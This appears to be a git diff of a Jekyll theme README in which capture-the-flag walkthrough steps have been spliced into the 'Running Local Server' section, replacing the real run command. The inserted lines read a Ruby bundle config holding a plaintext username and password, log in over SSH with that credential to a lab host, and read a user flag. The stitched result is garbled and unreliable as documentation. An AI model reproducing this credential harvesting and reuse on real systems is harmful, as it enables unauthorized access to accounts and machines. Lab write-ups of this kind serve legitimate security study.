@@ -139,10 +139,33 @@ Also, if you'd like to self-host the static assets, please refer to the [_chirpy
 
 ### Running Local Server
 
+```console
+$ ruby@precious:~/.bundle$ cat config
+cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+
+```
+
 You may want to preview the site contents before publishing, so just run it by:
 
 ```console
-$ bundle exec jekyll s
+$ ssh  henry@10.10.11.189 
+henry@10.10.11.189's password: 
+Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+-----
+henry@precious:~$ 
+
+```
+so we can capture the user flag 
+
+```console
+henry@precious:~$ ls
+user.txt
+
+henry@precious:~$ cat user.txt
+13***********
+
 ```
 
 Or run the site on Docker with the following command:
